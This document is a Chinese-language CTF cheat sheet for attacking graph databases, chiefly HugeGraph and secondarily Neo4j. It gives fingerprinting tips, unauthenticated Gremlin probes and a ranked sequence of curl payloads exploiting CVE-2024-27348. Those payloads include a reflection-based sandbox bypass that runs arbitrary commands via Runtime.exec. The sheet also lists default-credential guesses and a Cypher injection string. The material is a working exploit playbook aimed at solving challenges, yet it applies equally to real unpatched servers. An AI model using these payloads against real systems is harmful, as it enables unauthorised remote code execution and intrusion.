# 图数据库利用（HugeGraph / Neo4j）

> 适用：关联关系检索引擎、知识图谱、图数据库服务题（图数据库类）。

## 指纹识别
- 端口 8080 + `/gremlin`、`/graphs`、`gremlin-server` → HugeGraph。
- 端口 7474 / 7687 + `/db/data`、`neo4j` → Neo4j。
- 响应含 `gremlin-groovy`、`hugegraph`、`neo4j`、`bolt` 等。

## HugeGraph（重点）

### 认证与未授权
```bash
# 探测 Gremlin 端点
curl -s http://TARGET:8080/gremlin
curl -s http://TARGET:8080/apis/
# 未授权 Gremlin 执行（老版本）
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"g.V().count()"}'
```

### RCE（CVE-2024-27348，HugeGraph-Server）

CVE-2024-27348 核心：HugeGraph-Server 的 Gremlin 端点未正确沙箱，Groovy 脚本可执行任意代码（1.3.0 之前版本）。

**先测未授权**：
```bash
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"1+1"}'
# 返回 2 = 未授权可执行 Groovy
```

**RCE payload（按顺序试，命中即停）**：
```bash
# 1. Groovy 直接 execute（最简，老版本直接命中）
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"\"id\".execute().text"}'

# 2. bash -c 变体
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"[\"bash\",\"-c\",\"id\"].execute().text"}'

# 3. 反射链（若 1/2 被拦）
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"Class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")"}'

# 4. 反射拿 Runtime（CVE-2024-27348 沙箱绕过核心）
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"def r=Class.forName(\"java.lang.Runtime\").getDeclaredMethods().find{it.name==\"getRuntime\"}.invoke(null); r.exec(\"id\").text"}'
```

**读 flag**：
```bash
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"[\"bash\",\"-c\",\"cat /flag /challenge/flag* 2>/dev/null\"].execute().text"}'
```

**关键陷阱**：
- 返回 `Not allowed to execute command via Gremlin` 说明有沙箱，改试 payload 4（反射绕过）。
- 需要认证时试 admin/admin、admin/password；或先未授权探测 `/apis`、`/graphs`。
- 拿到 RCE 后 `find / -name 'flag*' 2>/dev/null`。

## Neo4j（次要）

### Cypher 注入
```bash
# 登录接口若拼接 Cypher 查询
' OR 1=1 RETURN labels() //
# Neo4j Shell Server 注入（CVE-2021-34371）
```

## 通用思路
1. 图数据库题通常不是让你"爆破"，而是**注入 Gremlin/Cypher 查询**或利用**未授权 RCE**。
2. 先确认端点是否未授权，再找 Gremlin/Cypher 注入点。
3. 目标是读图数据里的 flag，或 RCE 后搜文件。
4. 同主机可能还有其他服务（图数据库类门户），逐个端口独立指纹。
